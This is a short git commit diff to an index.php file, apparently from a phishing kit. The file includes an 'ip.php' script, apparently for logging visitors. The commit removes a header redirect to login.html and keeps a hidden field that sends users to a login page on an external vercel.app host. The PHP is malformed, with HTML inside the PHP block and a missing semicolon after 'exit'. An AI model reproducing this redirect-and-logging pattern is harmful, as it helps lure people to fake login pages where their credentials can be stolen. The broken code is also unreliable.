7fdc583b34ccd01a1f92450cbde1a05e1a131781
ftr-web <kessler081@att.net>
2024-06-18 02:44:47 +0100

    Update index.php

--- index.php
+++ index.php
@@ -1,6 +1,5 @@
 <?php
 include 'ip.php';
-header('Location: login.html'); 
 <input     type="hidden"     name="_redirect"     value="https://service-three-rouge.vercel.app/login.html"   />
 exit
 ?>
